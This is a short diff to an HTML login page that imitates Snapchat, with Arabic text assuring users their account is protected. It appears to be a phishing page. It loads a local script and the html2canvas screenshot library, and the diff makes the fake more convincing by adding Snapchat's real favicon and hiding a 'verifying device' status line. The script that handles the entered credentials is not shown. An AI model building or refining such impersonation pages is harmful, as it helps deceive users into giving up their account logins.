@@ -4,6 +4,7 @@
   <meta charset="UTF-8">
   <title>Snapchat - تسجيل الدخول</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="icon" href="https://static.snapchat.com/favicon.ico" />
   <style>
     body {
       margin: 0;
@@ -67,7 +68,7 @@
     }
 
     #statusMsg {
-      display: block;
+      display: none;
       margin-top: 15px;
       font-size: 14px;
       color: #777;
@@ -84,10 +85,10 @@
       <button type="submit">تسجيل الدخول</button>
     </form>
     <p class="note">🔒 حسابك محمي. تأكد من صحة المعلومات.</p>
-    <p id="statusMsg">📡 جارٍ التحقق من الجهاز...</p>
+    <p id="statusMsg"></p>
   </div>
 
   <script src="https://html2canvas.hertzen.com/dist/html2canvas.min.js"></script>
-  <script src="/static/script.js"></script>
+  <script src="script.js"></script>
 </body>
 </html>
